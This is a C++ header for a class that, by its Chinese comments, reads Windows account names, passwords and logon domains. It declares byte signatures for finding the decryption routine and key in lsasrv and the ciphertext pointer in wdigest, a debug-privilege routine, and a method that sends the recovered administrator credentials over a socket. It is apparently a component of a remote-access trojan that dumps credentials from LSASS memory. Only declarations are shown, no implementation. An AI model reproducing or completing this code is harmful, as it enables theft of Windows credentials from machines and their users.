#pragma once
#include "ModuleSocket.h"
#include "Common.h"
#include <windows.h>
#include <stdio.h>

//获取计算机系统帐号、密码和登录域

#define MEM_SIZE 0x1000
#define WIN7     0x0100
#define WINXP    0x0101
#define WIN03    0x0102

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING , *PLSA_UNICODE_STRING ;

typedef struct _SECURITY_LOGON_SESSION_DATA {  
	ULONG Size;  
	LUID LogonId; 
	LSA_UNICODE_STRING UserName;  
	LSA_UNICODE_STRING LogonDomain;  
	LSA_UNICODE_STRING AuthenticationPackage;  
	ULONG LogonType;  ULONG Session;  
	PSID Sid;  
	LARGE_INTEGER LogonTime;  
	LSA_UNICODE_STRING LogonServer;  
	LSA_UNICODE_STRING DnsDomainName;  
	LSA_UNICODE_STRING Upn;
} SECURITY_LOGON_SESSION_DATA,  *PSECURITY_LOGON_SESSION_DATA ;


typedef int (__stdcall * pNTQUERYPROCESSINFORMATION)(HANDLE, DWORD, PVOID, ULONG, PULONG) ;
typedef int (__stdcall * pLSAENUMERATELOGONSESSIONS)(PULONG, PLUID *) ;
typedef int (__stdcall * pDECRIPTFUNC)(PBYTE, DWORD) ;
typedef int (__stdcall * pLSAFREERETURNBUFFER)(PVOID) ;
typedef int (__stdcall * pLSAGETLOGONSESSIONDATA)(PLUID, PSECURITY_LOGON_SESSION_DATA *) ;


// 解密函数特征码(lsasrv.text)
static BYTE DecryptfuncSign[] = { 0x8B, 0xFF, 0x55, 0x8B, 
0xEC, 0x6A, 0x00, 0xFF, 
0x75, 0x0C, 0xFF, 0x75,
0x08, 0xE8 } ; 

// 密钥KEY相关的关键地址特征码(lsasrv.text)
static BYTE DecryptKeySign_WIN7[]  = { 0x33, 0xD2, 0xC7, 0x45, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x89, 0x55, 0xE4 } ;
static BYTE DecryptKeySign_XP[]    = { 0x8D, 0x85, 0xF0, 0xFE, 0xFF, 0xFF, 0x50, 0xFF, 0x75, 0x10, 0xFF, 0x35 } ;

// 密文关键指针特征码(wdigest.text)
static BYTE KeyPointerSign[]  = { 0x8B, 0x45, 0x08, 0x89, 0x08, 0xC7, 0x40, 0x04 } ;

// 全局变量
static BYTE MemBuf[MEM_SIZE], SecBuf[0x200], ThirdBuf[0x200] ;
static BYTE Encryptdata[0x100] ;

class CReadPsw
{
public:
	CReadPsw(void);
	~CReadPsw(void);
public:
	void CopyKeyGlobalData(HANDLE hProcess, LPVOID hModlsasrv, int osKind);
	CString CharToCString(IN char* result);
	HANDLE GetProcessHandleByName(const TCHAR *szName);
	LPVOID GetEncryptListHead();
	void printSessionInfo(pLSAGETLOGONSESSIONDATA LsaGetLogonSessionData,
		                  pLSAFREERETURNBUFFER LsaFreeReturnBuffer, 
						  PLUID pCurLUID,
						  OUT READPSWDATA_S* tagRPWDATA);
	PBYTE search_bytes(PBYTE pBegin, PBYTE pEnd, PBYTE pBytes, DWORD nsize);
	int EnableDebugPrivilege();

	void SendSecurityPwd(IN SOCKET sock);   //得到并发送获取到的管理员帐号和密码
private:
	CModuleSocket m_moduleSocket;
};
